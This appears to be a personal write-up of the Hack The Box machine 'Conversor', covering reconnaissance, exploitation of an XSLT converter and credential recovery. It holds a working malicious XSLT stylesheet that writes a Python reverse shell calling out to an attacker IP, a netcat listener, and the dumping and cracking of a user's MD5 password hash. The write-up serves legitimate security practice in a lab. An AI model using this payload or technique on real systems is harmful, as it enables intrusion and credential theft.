“Knowledge is not for knowing: knowledge is for cutting.” - Michel Foucault

our box today is conversor, while this one is labled as easy I will admit I had issues with it, specifically when stablizing a shell on the victim machine, this machine is labled as linux.  

first we start by adding the Target IP to our /etc/hosts 

└─$ cat /etc/hosts     
127.0.0.1	localhost


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.26.134 artificial.htb
10.129.232.59 code.htb
10.129.229.66   2million.htb
10.129.5.50 conversor.htb

then we open up the page and we see that the page is dedicated to converting Nmap XML output into a better readable HTML format using XSLT. 

I had to do my research as always, XSLT = extensible stylesheet language transformations. XSLT is a language used to transform XML documents into other formats such as HTML, plain text, or other structures based on rules. 

now what is XML? XML is an extensible markup language, from google "Tags describe the data they contain (e.g., <name>David</name>), not just how to display it, making data understandable without needing to know the original file's structure."

In short the webapp takes an XML nmap output and an XSLT stylesheet that formats the output and then outputs thw results in a readable more stylish or simpler way. 

very cool if you ask me. 

now lets get on with our Nmap results, for this we will use common flags

---------------------

-sC — default script scanning

-sV — service version detection


nmap -sC -sV -oA conversor_nmap conversor.htb

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 14:37 CST
Nmap scan report for conversor.htb (10.129.5.50)
Host is up (0.63s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Login
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.25 seconds



--------------

we see port 22 SSH & 80 http are open, we see that apache is serving the webapp, we also confirm linux, the best OS. 

--------------------

next lets run some directory enumeration 

 gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://conversor.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/login                (Status: 200) [Size: 722]
/logout               (Status: 302) [Size: 199] [--> /login]

-------------

from here I think we have enough to manually go through the webapp a bit, 
we go to login, then we find we need to register, all simple, we registser using easy credentials, 

then after logging in we see the converter page
we see a XML & XSLT File upload, with some example files provided we can see that there an nmap results output, very cool again, 

initial we did not see the download link on the about page which would have saved us some time, but we knew the exploit would most likely lie in the uploading of documents, we knew of a earlier machine that had a similar exploit, 

so we use this cat rce.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/test2.py" method="text">
import os

os.system(
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.86\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
)
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>


in which we will use a NC revshell to catch the shell, 
 nc -lvnp 4444      
listening on [any] 4444 ...
connect to [10.10.16.86] from (UNKNOWN) [10.129.5.50] 42404
/bin/sh: 0: can't access tty; job control turned off
$ ls
conversor.htb


after uploading we get this, an unstable shell, awesome!

we start exploring the shell 

$ cd home $ ls fismathack $ cd fismathack /bin/sh: 81: cd: can't cd to fismathack $ cat fismathack cat: fismathack: Permission denied $ ls fismathack $

as you can see here there is a user named fismathack, so okay we write that down,

then cd into 
conversor.htb -> instance -> users.db 

cat users.db
�7����0�?tablefilesfilesCREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
���zV'M----c51c1b797185ce515d93268a116811c9.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
����---- usersthack


here we see an interesting line  !Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec


again the user fismathack appears and so does a hashed password, 5b5c3ac3a1c897c94caad48e6c71fdec -> MD5 

originally this took us some time in recognizing what we had seen, we didnt see this originally and didnt recognize the md5 hash, we convert it using a simple MD5 hash cracker, Free Password Hash Cracker
crackstation . com -> 5b5c3ac3a1c897c94caad48e6c71fdec -> Keepmesafeandwarm


boom now we have the user fismathack and their password Keepmesafeandwarm

